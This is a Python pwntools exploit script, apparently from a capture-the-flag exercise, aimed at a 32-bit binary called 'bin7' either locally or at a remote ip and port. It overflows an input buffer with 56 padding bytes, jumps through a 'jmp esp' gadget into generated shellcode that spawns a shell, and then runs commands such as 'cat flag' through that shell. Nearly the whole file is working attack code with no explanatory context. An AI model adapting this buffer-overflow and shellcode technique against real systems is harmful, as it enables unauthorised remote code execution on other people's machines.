import string
from pwn import *
from struct import pack

def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local:

		p = process(binary)

	else:

		p = remote(ip,port,timeout=timeout)
	
	try:	
		shellcode = 'A'*56

		shellcode += pack('<I', 0x080de7d3)  # jmp esp
		shellcode += asm(shellcraft.sh())

		p.recvuntil('your age:',timeout=timeout)
		p.sendline('0')
		p.recvuntil('your name:',timeout=timeout)
		p.send('echo579')
		p.recvuntil('your commit',timeout=timeout)
		p.sendline(shellcode)

		p.sendline('echo 123')

		p.recvuntil('123',timeout=timeout)

		p.sendline(msg)

		p.sendline('echo 456')

		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()

		return flag[:-3]
	except:
		p.close()
		return ''


if __name__ == '__main__':
	print exp(True,'bin7','cat flag')
